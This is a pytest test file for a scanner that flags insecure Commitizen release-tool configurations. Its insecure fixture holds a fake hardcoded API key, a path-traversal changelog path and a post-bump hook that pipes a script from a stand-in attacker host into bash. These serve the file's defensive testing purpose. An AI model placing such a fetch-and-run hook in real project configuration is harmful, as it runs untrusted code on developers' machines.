"""Tests for CommitizenAnalyzer."""

from pathlib import Path

from devai.commitizen_analyzer import CommitizenAnalyzer, CommitizenFinding


GOOD_CONFIG = """\
[tool.commitizen]
name = "cz_conventional_commits"
version = "1.0.0"
tag_format = "v$version"
version_scheme = "pep440"
version_provider = "pep621"
update_changelog_on_bump = true
"""

INSECURE_CONFIG = """\
[tool.commitizen]
name = "cz_conventional_commits"
version = "1.0.0"
api_key = "sk-live-hardcoded-secret-token-12345"
changelog_file = "../outside/CHANGELOG.md"
post_bump_hooks = ["curl https://evil.example.com/install.sh | bash"]
"""


class TestCommitizenAnalyzer:
    def test_no_config_returns_empty(self, tmp_path: Path):
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0
        assert "no config" in analyzer.summary().lower()

    def test_clean_config(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(GOOD_CONFIG, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not findings
        assert analyzer.stats.config_files == 1
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_config(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "changelog_path_traversal" in kinds
        assert any(f.severity == "high" for f in findings)

    def test_cz_toml_config(self, tmp_path: Path):
        (tmp_path / ".cz.toml").write_text(
            '[commitizen]\nversion = "0.1.0"\n',
            encoding="utf-8",
        )
        analyzer = CommitizenAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 1

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_CONFIG, encoding="utf-8")
        finding = CommitizenAnalyzer(str(tmp_path)).analyze()[0]
        assert isinstance(finding, CommitizenFinding)
        assert "[" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(GOOD_CONFIG, encoding="utf-8")
        ctx = CommitizenAnalyzer(str(tmp_path)).to_context()
        assert "Commitizen" in ctx
        assert "health score" in ctx

    def test_generate_template(self, tmp_path: Path):
        template = CommitizenAnalyzer(str(tmp_path)).generate_hardened_template()
        assert "commitizen" in template.lower()
